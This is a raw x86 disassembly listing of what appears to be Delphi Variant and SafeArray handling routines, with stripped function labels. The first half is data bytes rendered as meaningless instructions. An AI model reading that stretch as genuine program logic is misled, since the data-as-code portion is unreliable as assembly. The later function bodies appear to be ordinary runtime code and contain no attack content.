je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor cl ah
inc eax
outsd
jb r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
int3
inc ebx
popad
jb r-xdata
add al 0xe0
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
pop ss
outsb
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
ror ah 0xe0
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
loope r-xdata
shr [ eax - 0x20 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
clc
inc eax
add [ eax + 0x15004032 ] dl
inc ebp
push esi
popad
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0x17004032 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
loope r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe0
add [ eax ] al
add [ eax + 0x78 ] ch
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
mov al [ 0x40df ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040df ] ah
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
loop r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jbe r-xdata
popad
outsb
je r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
inc ebp
jb r-xdata
add ah dh
xor al 0x40
add al bh
xor al 0x40
jb r-xdata
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
jb r-xdata
outsd
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
loope r-xdata
sar al 0xe1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add [ eax - 0x1e ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1e ] ah
inc eax
jb r-xdata
loope r-xdata
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
loope r-xdata
outsd
je r-xdata
popad
inc eax
popad
outsb
je r-xdata
popad
jb r-xdata
popad
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add al cl
loop r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0x15004032 ] dl
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0040 ] dl
jb r-xdata
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
add [ eax + eax ] cl
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x17004032 ] dl
dec bp
insd
outsd
jb r-xdata
popad
jb r-xdata
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x18004032 ] dl
inc ebp
push esi
outsd
outsb
je r-xdata
popad
outsb
je r-xdata
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al 0x45
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
loop r-xdata
push esi
popad
jb r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0x14004032 ] dl
inc ebp
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jecxz r-xdata
inc ebp
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x56 ] al
inc eax
insd
add [ eax + 0x15004032 ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
pop ss
jne r-xdata
jo r-xdata
popad
je r-xdata
add [ ebx ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
jns r-xdata
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
clc
popad
dec ebp
in al 0x8b
mov ebx eax
popad
rcl [ ebp - 0x75 ] 0xec
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
xor eax eax
push ebp
add esp 0xffffffe4
push ebx
popad
outsb
je r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e45a
push [ fs : eax ]
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
clc
dec edi
jb r-xdata
inc ebp
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
je r-xdata
je r-xdata
inc eax
add [ ebx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0040 ] dl
outsd
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e461
lea eax [ ebp - 0x4 ]
call sub_404074
retn
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
add [ edi + edi * 8 + 0x30 ] ah
outsd
add [ edx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
jb r-xdata
add [ eax ] al
push 0xe8004078
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
add [ eax + eax ] cl
jb r-xdata
push sub_40e4f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410154
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410154
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4fa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404098
retn
jb r-xdata
outsd
jb r-xdata
inc ebp
jecxz r-xdata
jns r-xdata
sub_40e410
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e45a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e461
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40e464
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e4f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410154
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410154
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4fa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404098
retn
sub_40e500
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e54a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e551
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40e554
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e5e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410154
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410154
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5ea
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404098
retn
sub_40e5f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e63a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e641
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40e644
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e889
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e890
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404098
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
dec eax
je r-xdata
call sub_40e410
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
jmp r-xdata
call sub_40e500
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ae34
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
jmp r-xdata
sub_40e8a4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e464
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e554
jmp r-xdata
jmp r-xdata
call sub_40e644
sub_40e8d8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e922
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e929
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40e940
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e970
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e970
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e9cc
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e898
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e898
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e940
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e898
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e898
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e970
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e898
mov eax [ ebp - 0x314 ]
call sub_40ebc4
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40eb48
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e898
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404074
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4105b0
test al al
je r-xdata
mov eax ebx
call sub_40e9cc
jmp r-xdata
push ebx
call VariantClear
call sub_40e898
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ebe0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ec10
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ec10
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ec6c
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e898
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e898
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ebc4
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e5f0
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e898
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e898
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ebe0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ec10
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e898
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e898
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee40
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40eb48
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e898
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
